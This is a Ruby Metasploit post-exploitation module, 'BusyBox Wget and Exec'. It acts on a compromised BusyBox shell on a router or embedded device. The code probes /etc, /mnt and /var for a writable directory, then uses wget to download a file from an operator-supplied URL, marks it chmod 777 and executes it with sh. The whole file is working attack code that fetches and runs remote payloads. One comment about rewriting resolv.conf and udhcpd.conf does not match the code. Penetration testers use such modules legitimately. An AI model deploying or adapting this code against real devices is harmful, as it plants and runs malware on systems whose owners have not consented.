##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  def initialize
    super(
      'Name'         => 'BusyBox Wget and Exec',
      'Description'  => 'This module will be applied on a session connected
                         to a BusyBox sh shell. The script will use wget to download
                         a file to the router or device executing BusyBox and then
                         it executes the download file.',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
       'SessionTypes'  => ['shell']
    )

    register_options(
      [
        OptString.new('URL', [true, 'Full URL of file to download.'])
      ], self.class)

  end

  #The module tries to update resolv.conf file with the SRVHOST dns address. It tries to update
  #udhcpd.conf too, with SRVHOST dns address, that should be given to network's hosts via dhcp

  def run
    vprint_status("Trying to find writable directory.")
    writable_directory = nil
    writable_directory = "/etc/" if is_writable_directory("/etc")
    writable_directory = "/mnt/" if (!writable_directory && is_writable_directory("/mnt"))
    writable_directory = "/var/" if (!writable_directory && is_writable_directory("/var"))
    writable_directory = "/var/tmp/" if (!writable_directory && is_writable_directory("/var/tmp"))
    if writable_directory
      vprint_status("writable directory found, downloading file.")
      rand_str = ""; 16.times{rand_str  << (65 + rand(25)).chr}
      random_file_path = writable_directory + rand_str
      cmd_exec("wget -O #{random_file_path} #{datastore['URL']}"); Rex::sleep(0.1)
      if file_exists(random_file_path)
        print_good("File downloaded using wget. Executing it.")
        cmd_exec("chmod 777 #{random_file_path}"); Rex::sleep(0.1)
        vprint_status(cmd_exec("sh #{random_file_path}"))
      else
        print_error("Unable to download file.")
      end
    else
      print_error("Writable directory not found.")
    end
  end

  #This function checks if the target directory is writable

  def is_writable_directory(directory_path)
    retval = false
    rand_str = ""; 16.times{rand_str  << (65 + rand(25)).chr}
    file_path = directory_path + "/" + rand_str
    session.shell_write("echo #{rand_str}XXX#{rand_str} > #{file_path}\n"); Rex::sleep(0.1)
    (1..5).each{session.shell_read(); Rex::sleep(0.1)}
    rcv = read_file(file_path)
    vprint_status("is_writable_directory:"+rcv)
    if rcv.include? (rand_str+"XXX"+rand_str)
      retval = true
    end
    cmd_exec("rm -f #{file_path}"); Rex::sleep(0.1)
    return retval
  end

  #file? doesnt work because test -f is not implemented in busybox
  def file_exists(file_path)
    s = read_file(file_path)
    if s and s.length
      return true
    end
    return false
  end

end
